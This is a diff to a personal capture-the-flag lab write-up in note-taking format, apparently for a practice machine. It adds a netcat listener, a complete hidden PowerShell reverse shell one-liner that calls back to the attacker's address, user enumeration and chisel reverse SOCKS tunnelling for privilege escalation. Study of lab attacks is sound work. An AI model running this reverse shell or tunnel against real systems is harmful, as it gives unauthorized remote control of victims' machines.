@@ -58,4 +58,38 @@ python 48506.py http://10.10.10.198:8080/
 >![[Pasted image 20250304222313.png]]
 >![[Pasted image 20250304222540.png]]
 
-# 
+- now we can upgrade own session
+```bash
+rlwrap -cAr nc -nlvp 4444
+```
+- and on the victim machine
+```cmd
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.6', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+```
+>[!example]- Result
+>![[Pasted image 20250304230220.png]]
+# Privilege Escalation
+## Enumerating
+- Local opened ports
+>[!example]- Result
+>![[Pasted image 20250304232133.png]]
+
+- Get local users
+```cmd
+net users
+```
+>[!example]- Result
+>![[Pasted image 20250304235549.png]]
+- lets use [[chisel]] in order to create a proxy and get connection to this ports
+Attacker
+```bash
+./chisel server --reverse -p 1234
+```
+Victim
+```bash
+.\chisel.exe client 10.10.16.6:1234 R:9999:socks
+```
+
+- after configure proxychain we have access
+>[!example]- Result
+>![[Pasted image 20250304235229.png]]
